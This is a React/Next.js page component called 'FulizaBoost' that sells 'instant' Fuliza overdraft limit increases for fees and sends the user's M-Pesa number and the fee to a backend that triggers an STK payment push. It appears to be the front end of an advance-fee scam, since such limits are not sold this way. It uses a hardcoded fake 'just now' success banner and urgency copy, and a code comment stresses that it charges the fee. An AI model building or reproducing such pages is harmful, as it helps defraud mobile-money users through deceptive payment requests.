"use client";

import React, { useState } from "react";

type Limit = {
  id: string;
  amount: number;
  fee: number;
};

const limits: Limit[] = [
  { id: "l1", amount: 5000, fee: 49 },
  { id: "l2", amount: 7500, fee: 80 },
  { id: "l3", amount: 10000, fee: 120 },
  { id: "l4", amount: 12500, fee: 140 },
  { id: "l5", amount: 16000, fee: 180 },
  { id: "l6", amount: 21000, fee: 200 },
  { id: "l7", amount: 25500, fee: 220 },
  { id: "l8", amount: 30000, fee: 350 },
  { id: "l9", amount: 35000, fee: 420 },
  { id: "l10", amount: 40000, fee: 540 },
  { id: "l11", amount: 45000, fee: 680 },
  { id: "l12", amount: 50000, fee: 960 },
  { id: "l13", amount: 60000, fee: 1550 },
  { id: "l14", amount: 70000, fee: 2000 },
];

export default function FulizaBoost() {
  const [selectedLimit, setSelectedLimit] = useState<Limit | null>(null);
  const [loadingId, setLoadingId] = useState<string | null>(null);
  const [message, setMessage] = useState<string | null>(null);
  const [phone, setPhone] = useState("");

  const handleBuy = async () => {
    if (!selectedLimit) return;
    if (!phone) {
      setMessage("Please enter a phone number");
      return;
    }

    setLoadingId(selectedLimit.id);
    setMessage("Processing payment...");

    const BACKEND_URL =
      process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";

    try {
      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          amount: selectedLimit.fee, // 🔥 IMPORTANT: charging the FEE
          local_id: `O${Date.now().toString(36)}${crypto
            .getRandomValues(new Uint8Array(2))
            .join("")}`,
          transaction_desc: `Fuliza increase to Ksh ${selectedLimit.amount}`,
        }),
      });

      const data = await res.json();

      if (data.status) {
        setMessage("STK Push sent! Check your phone.");
      } else {
        setMessage("Payment failed. Try again.");
      }
    } catch {
      setMessage("Error sending payment. Try again later.");
    } finally {
      setLoadingId(null);
      setTimeout(() => setMessage(null), 5000);
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f7fb] flex justify-center">
      <div className="w-full max-w-md pb-10">

        {/* Header */}
        <div className="bg-white px-4 pt-6 pb-4 shadow-sm text-center font-bold text-lg">
          Increase Fuliza Limit
        </div>

        {/* FulizaBoost Title */}
        <div className="text-center mt-6">
          <h2 className="text-2xl font-bold">
            <span className="text-blue-500">Fuliza</span>
            <span className="text-green-500">Boost</span>
          </h2>
          <p className="text-xs text-gray-500 mt-1">
            Instant Limit Increase • No Paperwork • Same Day Access
          </p>
        </div>

        {/* Info Box */}
        <div className="bg-white mx-4 mt-6 p-4 rounded-2xl border text-sm text-gray-600">
          ⚠ Choose your new Fuliza limit and complete the payment to get instant access.
        </div>

        {/* Recent Increase */}
        <div className="mx-4 mt-4 bg-green-50 border-l-4 border-green-400 p-3 rounded-xl text-sm">
          07201****62 increased to <strong>Ksh 34,000</strong> — just now
        </div>

        {/* Progress Bar */}
        <div className="flex mx-4 mt-4 h-2 rounded-full overflow-hidden">
          <div className="bg-blue-400 w-1/3"></div>
          <div className="bg-green-400 w-1/3"></div>
          <div className="bg-red-400 w-1/3"></div>
        </div>

        {/* Section Title */}
        <div className="mx-4 mt-6 text-blue-600 font-semibold text-sm">
          💼 Select Your Fuliza Limit
        </div>

        {/* Limit Grid */}
        <div className="grid grid-cols-2 gap-4 px-4 mt-4">
          {limits.map((limit) => (
            <div
              key={limit.id}
              onClick={() => setSelectedLimit(limit)}
              className={`p-4 rounded-2xl border-2 cursor-pointer transition text-center ${
                selectedLimit?.id === limit.id
                  ? "border-blue-600 bg-blue-50"
                  : "border-blue-200 bg-white"
              }`}
            >
              <div className="font-semibold text-gray-800">
                Ksh {limit.amount.toLocaleString()}
              </div>
              <div className="text-xs text-gray-500">
                Fee: Ksh {limit.fee}
              </div>
            </div>
          ))}
        </div>

        {/* Phone Input */}
        <div className="px-4 mt-6">
          <input
            type="tel"
            placeholder="Enter M-Pesa number"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            className="w-full border rounded-xl p-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none"
          />
        </div>

        {/* Continue Button */}
        <div className="px-4 mt-4">
          <button
            onClick={handleBuy}
            disabled={loadingId !== null}
            className="w-full bg-blue-600 text-white py-3 rounded-xl font-semibold"
          >
            {loadingId ? "Processing..." : "Continue"}
          </button>
        </div>

        {/* Message */}
        {message && (
          <div className="mx-4 mt-4 bg-blue-600 text-white p-3 rounded-xl text-center text-sm">
            {message}
          </div>
        )}
      </div>
    </div>
  );
}
